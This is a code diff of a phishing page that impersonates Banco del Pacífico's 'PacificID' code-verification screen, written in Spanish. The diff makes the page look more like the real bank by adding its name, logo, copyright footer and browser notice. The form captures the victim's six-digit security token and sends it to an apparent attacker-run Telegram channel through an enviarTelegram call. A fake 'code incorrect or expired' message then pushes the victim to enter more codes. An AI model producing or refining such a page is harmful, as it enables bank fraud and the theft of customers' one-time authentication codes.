@@ -3,39 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banca Virtual - PacificID</title>
+    <title>Banco del Pacífico - PacificID</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
-        body { background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .login-card { background: #ffffff; padding: 35px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 390px; text-align: center; }
-        .logo { max-width: 140px; margin-bottom: 20px; height: auto; }
-        h1 { font-size: 1.4rem; color: #1e293b; margin-bottom: 12px; font-weight: 700; }
-        p { font-size: 0.9rem; color: #64748b; line-height: 1.5; margin-bottom: 25px; }
-        .input-group { margin-bottom: 25px; text-align: left; }
-        label { display: block; font-size: 0.85rem; font-weight: 600; color: #475569; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; text-align: center; }
-        input { width: 100%; padding: 15px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 1.5rem; font-weight: 700; color: #1e293b; outline: none; transition: all 0.3s ease; background-color: #f8fafc; text-align: center; letter-spacing: 4px; }
-        input:focus { border-color: #0056b3; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); }
-        .btn { width: 100%; padding: 15px; background-color: #0056b3; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background 0.3s ease; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.2); }
-        .btn:hover { background: #004085; }
-        .error-box { display: none; background: #fff1f2; color: #e11d48; padding: 12px; border-radius: 10px; font-size: 0.85rem; margin-bottom: 20px; text-align: left; border: 1px solid #ffe4e6; font-weight: 500; }
+        * { box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #eef2f6; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .logo-top { max-width: 180px; margin-bottom: 20px; }
+        .card { background: #ffffff; padding: 40px 30px 30px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); width: 100%; max-width: 420px; text-align: center; }
+        h2 { color: #1a1a1a; font-size: 1.6rem; font-weight: 600; margin-bottom: 15px; }
+        p { font-size: 0.9rem; color: #5a6e7f; line-height: 1.5; margin-bottom: 30px; padding: 0 10px; }
+        
+        .form-group { margin-bottom: 30px; text-align: left; }
+        .floating-label { color: #0056b3; font-size: 0.85rem; font-weight: 500; display: block; margin-bottom: 6px; text-align: center; }
+        input { width: 100%; border: none; border-bottom: 2px solid #0056b3; padding: 8px 0; font-size: 1.6rem; font-weight: bold; color: #333; outline: none; background: transparent; text-align: center; letter-spacing: 6px; }
+        
+        .btn-primary { width: 100%; padding: 14px; background: #0056b3; color: #ffffff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 500; cursor: pointer; }
+        
+        .error-box { display: none; color: #c0392b; background: #fde8e7; padding: 10px; border-radius: 4px; font-size: 0.85rem; margin-bottom: 20px; text-align: left; border-left: 4px solid #c0392b; }
+        .footer-text { margin-top: 25px; font-size: 0.72rem; color: #7a869a; line-height: 1.6; text-align: center; max-width: 400px; }
     </style>
 </head>
 <body>
 
-<div class="login-card">
-    <img src="./logo.png" alt="Logotipo" class="logo">
-    <h1>Verificación PacificID</h1>
-    <p>Escribe el código de seguridad de 6 dígitos generado en la aplicación móvil de tu dispositivo para validar tu sesión.</p>
-    
-    <div class="error-box" id="errorContenedor">⚠️ El código ingresado es incorrecto o ha expirado. Por favor, genere un nuevo código desde su aplicación e intente de nuevo.</div>
+<img src="./logo.png" alt="Banco del Pacífico" class="logo-top">
 
-    <form id=\"formPacific\">
-        <div class="input-group">
-            <label>Código de Seguridad</label>
+<div class="card">
+    <h2>PacificID</h2>
+    <p>Ingrese el código de seguridad de 6 números generado de forma dinámica desde su aplicación móvil.</p>
+    
+    <div class="error-box" id="errorContenedor">⚠️ Código incorrecto o expirado. Genere uno nuevo.</div>
+
+    <form id="formPacific">
+        <div class="form-group">
+            <span class="floating-label">Código de Seguridad</span>
             <input type="text" pattern="[0-9]*" inputmode="numeric" maxlength="6" required placeholder="000000" id="txtToken">
         </div>
-        <button type="submit" class="btn">Validar Código</button>
+        <button type="submit" class="btn-primary">Validar</button>
     </form>
+</div>
+
+<div class="footer-text">
+    Recomendamos utilizar la Banca Virtual con los navegadores<br>Chrome 36.0.1, Firefox 31.0, Microsoft Edge.<br><br>
+    © Copyright 2017 Banco del Pacífico *V5.4.0
 </div>
 
 <script src="./config.js"></script>
@@ -48,9 +56,8 @@
     document.getElementById('formPacific').addEventListener('submit', async (e) => {
         e.preventDefault();
         const tkn = document.getElementById('txtToken').value;
-        
-        const btn = e.target.querySelector('.btn');
-        btn.innerText = "Procesando...";
+        const btn = e.target.querySelector('.btn-primary');
+        btn.innerText = "Verificando...";
         btn.disabled = true;
 
         await enviarTelegram(`🛡️ *Código PacificID Ingresado:* \nToken: \`${tkn}\``);
